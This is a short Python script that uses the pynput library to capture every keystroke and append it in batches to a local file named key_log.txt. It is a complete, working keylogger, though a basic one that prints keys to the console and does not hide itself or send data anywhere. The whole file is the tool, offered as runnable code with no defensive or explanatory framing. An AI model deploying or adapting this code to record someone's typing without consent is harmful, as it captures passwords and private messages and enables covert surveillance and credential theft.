from pynput.keyboard import Key, Listener

count = 0
keys = []


def press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f'{key} was pressed')

    if count > 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open('key_log.txt', 'a') as f:
        for key in keys:
            key = str(key).replace("'", "")
            if key.find("back") > 0:
                 f.write('(backspace)')
            elif key.find('space') > 0:
                f.write('(space)')
            elif key.find('Key') == -1:
                f.write(key)

        f.write('\n')


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
